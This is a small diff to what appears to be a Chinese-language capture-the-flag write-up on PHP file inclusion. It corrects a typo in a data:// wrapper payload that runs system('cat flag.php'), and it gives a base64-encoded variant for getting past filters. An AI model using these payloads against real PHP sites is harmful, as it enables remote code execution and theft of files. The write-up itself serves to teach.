@@ -410,7 +410,7 @@ if(isset($_GET['file'])){
 payload:
 
 ```php
-data://test/plain,<?php system('cat flag.php');
+data://text/plain,<?php system('cat flag.php');
 有过滤使用编码绕过
 data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=
 ```
